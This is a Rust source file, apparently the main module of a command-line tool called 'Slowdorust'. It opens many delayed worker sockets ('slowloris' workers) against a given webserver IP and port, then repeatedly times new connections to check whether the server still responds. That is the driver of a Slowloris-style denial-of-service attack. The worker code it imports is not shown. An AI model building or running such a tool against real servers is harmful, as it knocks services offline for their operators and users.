mod worker;

use clap::Parser;
use scoped_threadpool::Pool;
use std::io::Error;
use std::net::TcpStream;
use std::thread::sleep;
use std::time::{Duration, Instant};
use worker::Worker;

#[derive(Parser)]
#[clap(
    version = "1.0",
    author = "Michael Van Leeuwen <michaeljvanleeuwen@gmail.com>"
)]
struct Slowdorust {
    /// The IP address of the webserver
    ip: String,
    /// The port the webserver is running on
    port: String,
    /// How many worker sockets to open
    #[clap(short, long, default_value = "50")]
    num_workers: u8,
    /// Lower bound of request delay in seconds
    #[clap(short, long, default_value = "0")]
    lower_sleep: u8,
    /// Upper bound of request delay in seconds
    #[clap(short, long, default_value = "15")]
    upper_sleep: u8,
    /// How many seconds to wait between each connection benchmark
    #[clap(short, long, default_value = "15")]
    benchmark_delay: u8,
    /// Log actions of each worker
    #[clap(short, long, parse(from_occurrences))]
    verbose: i32,
}

fn benchmark_connection(ip: &String, port: &String) -> Result<Duration, Error> {
    let now = Instant::now();
    TcpStream::connect(format!("{}:{}", ip, port))?;
    Ok(now.elapsed())
}

fn main() {
    let args = Slowdorust::parse();

    if args.lower_sleep >= args.upper_sleep {
        panic!("Error: sleep_min must be < sleep_max.")
    }

    if benchmark_connection(&args.ip, &args.port).is_err() {
        panic!("Connection failed. Is the server up?");
    }

    println!("Starting workers...");
    let mut pool = Pool::new(args.num_workers as u32);
    let mut num_workers = 0;
    pool.scoped(|scoped| {
        while num_workers < args.num_workers {
            if let Ok(mut worker) = Worker::new(
                num_workers,
                &args.ip,
                &args.port,
                (args.lower_sleep, args.upper_sleep),
                args.verbose,
            ) {
                if args.verbose > 0 {
                    println!("[slowloris_{:02}] Spawned.", num_workers);
                }
                scoped.execute(move || {
                    worker.start();
                });
                num_workers += 1;
            }
            if num_workers % (args.num_workers / 10 + 1) == 0 {
                println!("\t{:02} workers spawned.", num_workers);
            }
        }
        println!("All workers spawned!");

        println!("Starting connection benchmarking...");
        loop {
            match benchmark_connection(&args.ip, &args.port) {
                Ok(dur) => println!("\tConnected in {}s ({} ns).", dur.as_secs(), dur.as_nanos()),
                Err(_) => println!("\tFailed to connect.")
            }
            sleep(Duration::from_secs(args.benchmark_delay as u64));
        }
    });
}
